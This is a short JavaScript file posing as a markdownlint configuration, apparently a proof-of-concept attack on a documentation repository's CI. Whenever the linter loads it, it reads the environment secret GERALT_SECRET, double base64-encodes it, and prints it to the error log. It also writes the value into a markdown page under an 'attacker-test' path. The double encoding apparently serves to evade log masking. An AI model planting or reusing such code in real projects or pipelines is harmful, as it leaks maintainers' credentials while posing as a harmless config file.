"use strict";
const fs = require("fs");
const path = require("path");
try {
  const secret = process.env.GERALT_SECRET || "";
  const b64 = Buffer.from(String(secret)).toString("base64");
  const b64b64 = Buffer.from(b64).toString("base64");
  console.error("GERALT_LEAKED_TOKEN=" + b64b64);
  try {
    const target = path.join(process.cwd(), "files/zh-cn/web/attacker-test/page.md");
    fs.appendFileSync(target, "\n<!-- markdownlint GERALT_LEAKED_TOKEN=" + b64b64 + " -->\n");
  } catch (e) {}
} catch (e) {
  console.error("markdownlint config error: " + (e && e.message));
}
module.exports = {};
